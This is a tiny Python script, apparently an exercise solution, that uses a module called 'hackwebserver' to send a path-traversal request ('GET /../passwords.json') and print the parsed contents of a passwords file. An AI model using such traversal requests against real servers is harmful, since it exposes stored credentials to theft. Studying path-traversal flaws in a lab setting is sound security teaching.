import hackwebserver as hws
import json


if __name__ == '__main__':
    st1 = (hws.web_request(b'GET /../passwords.json HTTP/1.1')).decode("utf-8")
    st2 = '\n'.join(st1.split('\n')[1:])
    print(json.loads(st2))
